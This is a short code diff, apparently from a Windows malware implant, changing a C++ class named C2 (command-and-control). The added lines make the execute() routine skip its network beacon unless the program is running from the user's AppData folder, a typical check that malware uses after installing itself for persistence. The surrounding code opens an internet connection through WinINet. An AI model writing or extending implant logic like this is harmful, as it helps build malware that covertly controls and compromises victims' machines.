@@ -8,6 +8,8 @@
 #include <cstring>
 #include <iostream>
 
+
+
 void C2::setHostName(LPCSTR hostName) {
 	this->hostName = hostName;
 }
@@ -23,6 +25,13 @@ void C2::cleanup() {
 }
 
 void C2::execute() {
+	string path = this->util.getAppDataPath();
+	string dire = this->util.getCurrentDirectory();
+
+	if (path != dire) {
+		return;
+	}
+
 	this->response = ""; // reset response
 
 	this->error = InternetAttemptConnect(0);
